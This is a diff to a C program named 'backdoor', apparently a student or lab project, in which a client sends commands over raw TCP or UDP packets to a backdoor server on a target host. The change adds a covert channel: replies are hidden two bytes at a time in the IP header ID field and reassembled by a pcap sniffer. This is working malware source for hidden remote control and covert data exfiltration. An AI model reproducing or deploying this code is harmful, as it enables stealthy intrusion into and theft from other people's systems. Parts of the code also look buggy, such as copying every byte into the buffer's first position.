@@ -22,7 +22,7 @@
 */
 
 #include "bd.h"
-
+pcap_t *client_handle;          /* Client pcap session handle */
 /*
 | ------------------------------------------------------------------------------
 | Main Function
@@ -43,13 +43,14 @@ int main(int argc, char **argv){
     c_opt.target_host[0] = '\0';
     c_opt.command[0] = '\0';
     c_opt.target_port = 0;
+    c_opt.device[0] = '\0';
     c_opt.protocol = 0;
     struct server_opt s_opt;
     s_opt.device[0] = '\0';
     s_opt.protocol = 0;
     
     int opt;
-    while((opt = getopt(argc, argv, "hsc:d:p:ux:")) != -1){
+    while((opt = getopt(argc, argv, "hsi:d:p:ux:")) != -1){
         switch(opt){
             case 'h':
                 usage();
@@ -58,7 +59,8 @@ int main(int argc, char **argv){
             case 's':
                 is_server = 1;
                 break;
-            case 'c':
+            case 'i':
+                strcpy(c_opt.device, optarg);
                 strcpy(s_opt.device, optarg);
                 break;
             case 'd':
@@ -97,7 +99,7 @@ int main(int argc, char **argv){
         }
     }
     else{
-        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0){
+        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0 || c_opt.device[0] == '\0'){
             printf("Type -h for usage help.\n");
             return 1;
         }
@@ -158,14 +160,74 @@ void client(struct client_opt c_opt){
     
     // Send packet
      if(c_opt.protocol == 1)
-        send_udp_datagram(&user_addr, bd_message, bd_message_len);
+        send_udp_datagram(&user_addr, bd_message, bd_message_len, 0);
     else
-        send_tcp_datagram(&user_addr, bd_message, bd_message_len);
+        send_tcp_datagram(&user_addr, bd_message, bd_message_len, 0);
     
-    /* Receive reply and print */
+    /*
+    | --------------------------------------------------------------------------
+    | Listen for response
+    | --------------------------------------------------------------------------
+    */
     
-    printf("Waiting for reply...\n");
+    /* Initialize variables and functions */
     
+    
+    char *dev;                      /* The device to sniff on */
+    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
+    struct bpf_program fp;          /* The compiled filter */
+    char filter_exp[] = "port 12345"; /* The filter expression */
+    bpf_u_int32 mask;               /* Our netmask */
+    bpf_u_int32 net;                /* Our IP */
+    
+    // Get network interface
+    dev = c_opt.device;
+    if(dev == NULL) {
+        printf("Couldn't find default device: %s\n", errbuf);
+        system_fatal("pcap_lookupdev");
+    }
+    printf("Device: %s\n", dev);
+    
+    // Get interface properties
+    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1){
+        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
+        net = 0;
+        mask = 0;
+    }
+    
+    // Open sniffing session
+    client_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    if(client_handle == NULL) {
+        fprintf(stderr, "Couldn't open device: %s\n", errbuf);
+        system_fatal("pcap_open_live");
+    }
+    
+    /* Build packet filter */
+    
+    // Compile filter
+    if(pcap_compile(client_handle, &fp, filter_exp, 0, net) == -1){
+        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(client_handle));
+        system_fatal("pcap_compile");
+    }
+    
+    // Apply filter
+    if(pcap_setfilter(client_handle, &fp) == -1){
+        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(client_handle));
+        system_fatal("pcap_setfilter");
+    }
+    printf("Filter: %s\n", filter_exp);
+    
+    /* Packet capture loop */
+
+    // Packet capture loop
+    struct message_buffer msg_buf;
+    msg_buf.position = 0;
+    memset(msg_buf.buffer, 0, sizeof(msg_buf.buffer));
+    
+    printf("Capturing...\n");
+    pcap_loop(client_handle, -1, client_packet_handler, (u_char *)&msg_buf);
+    
+    /* OLD UDP METHOD
     // Initialize variables    
     int sockfd, n;
     struct sockaddr_in server, client;
@@ -193,10 +255,10 @@ void client(struct client_opt c_opt){
     printf("Reply: \n");
     printf("%s\n", reply);
     
-    /* Cleanup */
+    // Cleanup 
     
     free(bd_message);
-    close(sockfd);
+    close(sockfd);*/
 }
 
 /*
@@ -270,7 +332,7 @@ void server(struct server_opt s_opt){
 
     // Packet capture loop
     printf("Capturing...\n");
-    pcap_loop(handle, -1, packet_handler, (u_char *)&s_opt);
+    pcap_loop(handle, -1, server_packet_handler, (u_char *)&s_opt);
 }
 
 /*
@@ -279,7 +341,7 @@ void server(struct server_opt s_opt){
 | ------------------------------------------------------------------------------
 */
 
-int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len){
+int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode){
     
     /* Declare variables */
     
@@ -305,7 +367,23 @@ int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len){
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len));
-    iph->id = htons(DEFAULT_IP_ID);
+    
+    /* Covert Channel */
+    if(mode == 0)
+        iph->id = htons(DEFAULT_IP_ID);
+    else if(mode == 1){
+        if(data_len == 1){
+            ;
+        }
+        else if(data_len == 2){
+            ;
+        }
+        iph->id = htons(*((u_short *)data));
+        
+        // Set data to "" and 0 len
+        data_len = 0;
+    }
+    
     iph->frag_off = 0;
     iph->ttl = DEFAULT_TTL;
     iph->protocol = IPPROTO_TCP;
@@ -375,7 +453,7 @@ int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len){
 | ------------------------------------------------------------------------------
 */
 
-int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
+int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len, int mode){
     
     /* Declare variables */
     
@@ -401,7 +479,23 @@ int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
     iph->version = 4;
     iph->tos = 0;
     iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len));
-    iph->id = htons(DEFAULT_IP_ID);
+    
+    /* Covert Channel */
+    if(mode == 0)
+        iph->id = htons(DEFAULT_IP_ID);
+    else if(mode == 1){
+        if(data_len == 1){
+            ;
+        }
+        else if(data_len == 2){
+            ;
+        }
+        iph->id = htons(*((u_short *)data));
+        
+        // Set data to "" and 0 len
+        data_len = 0;
+    }
+    
     iph->frag_off = 0;
     iph->ttl = DEFAULT_TTL;
     iph->protocol = IPPROTO_UDP;
@@ -457,11 +551,47 @@ int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
 
 /*
 | ------------------------------------------------------------------------------
-| Packet Handler Function
+| Client Packet Handler Function
 | ------------------------------------------------------------------------------
 */
 
-void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
+void client_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
+    
+    struct message_buffer *msg_buf_ptr = (struct message_buffer *)args;
+    
+    printf("\n");
+    printf("Got packet...\n");
+    
+    /* Parse packet */
+    
+    // Get packet info
+    struct parsed_packet packet_info = {0}; // Initialize with 0
+    if(packet_typecast(packet, &packet_info) == 0){
+        printf("packet_typecast");
+        return;
+    }
+    
+    /* Covert Channel */
+    
+    printf("\nID: %c\n", packet_info.ip->ip_id);
+    memcpy(msg_buf_ptr->buffer, &(packet_info.ip->ip_id), 1);
+    printf("Buffer: %s\n", msg_buf_ptr->buffer);
+    msg_buf_ptr->position = msg_buf_ptr->position + 2;
+    
+    // If message is 11111111 11111111 or buffer is full, break;
+    if(packet_info.ip->ip_id == 65535 || msg_buf_ptr->position >= MESSAGE_MAX_SIZE){
+        printf("pcap_breakloop\n");
+        pcap_breakloop(client_handle);
+    }
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Server Packet Handler Function
+| ------------------------------------------------------------------------------
+*/
+
+void server_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
     
     struct server_opt *s_opt_ptr = (struct server_opt *)args;
     
@@ -480,11 +610,14 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     /* Decrypt remaining packet data */
     
     short payload_len = 0;
+    int packet_protocol = 0; // 0 for TCP, 1 for UDP
     if(packet_info.ip->ip_p == IPPROTO_UDP){
         payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct udphdr);
+        packet_protocol = 1;
     }
     else if(packet_info.ip->ip_p == IPPROTO_TCP){
         payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
+        packet_protocol = 0;
     }
     
     //printf("payload_len: %d\n",payload_len);
@@ -521,12 +654,12 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     u_short dport = 0; // Destination port is the source port of the packet
     u_short sport = 0; // Source port is the destination port of the packet
     int skt;
-    if(packet_info.ip->ip_p == IPPROTO_UDP){
+    if(packet_protocol == 1){
         dport = ntohs(packet_info.udp->uh_sport);
         sport = ntohs(packet_info.udp->uh_dport);
         skt = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     }
-    else if(packet_info.ip->ip_p == IPPROTO_TCP){
+    else if(packet_protocol == 0){
         dport = ntohs(packet_info.tcp->th_sport);
         sport = ntohs(packet_info.tcp->th_dport);
         skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -588,12 +721,40 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     printf("dport: %d\n", server_addr.dport);
     
     char test[] = "nexus";
-            
-    // Send packet
-    if(s_opt_ptr->protocol == 1)
-        send_udp_datagram(&server_addr, test, sizeof(test));
+    
+    // 2 bytes at a time
+    size_t test_len = strlen(test);
+    int c = 0;
+    for(c = 0; c < test_len; c = c + 2){
+        
+        char segment[2] = {0};
+        // Send 1 char
+        if(c + 1 >= test_len){
+            segment[0] = test[c];
+            segment[1] = (u_char)255;
+        }
+        // Send 2 chars
+        else{
+            segment[0] = test[c];
+            segment[1] = test[c + 1];
+        }
+        
+        // Send packet
+        if(packet_protocol == 1)
+            send_udp_datagram(&server_addr, segment, sizeof(segment), 1);
+        else
+            send_tcp_datagram(&server_addr, segment, sizeof(segment), 1);
+    }
+    
+    // Send ending packet 11111111 11111111 (65535)
+    char segment[2];
+    segment[0] = (u_char)255;
+    segment[1] = (u_char)255;
+    if(packet_protocol == 1)
+        send_udp_datagram(&server_addr, segment, sizeof(segment), 1);
     else
-        send_tcp_datagram(&server_addr, test, sizeof(test));
+        send_tcp_datagram(&server_addr, segment, sizeof(segment), 1);
+    
     
     /* Send results back to client */
     
@@ -643,14 +804,16 @@ void usage(){
     printf("Usage: ./backdoor [OPTIONS]\n");
     printf("---------------------------\n");
     printf("  -h                    Display this help.\n");
-    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
     printf("CLIENT (default)\n");
     printf("  -d <target_host>      The target host where the backdoor server is running.\n");
     printf("  -p <target_port>      The target port to send to.\n");
+    printf("  -i <interface_name>   Network interface to use.\n");
+    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
     printf("  -x <command>          The command to run on the target host.\n");
     printf("SERVER\n");
     printf("  -s                    Enables server mode.\n");
-    printf("  -c <device_name>      Network interface device name.\n");
+    printf("  -i <interface_name>   Network interface to use.\n");
+    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
     printf("\n");
 }
 
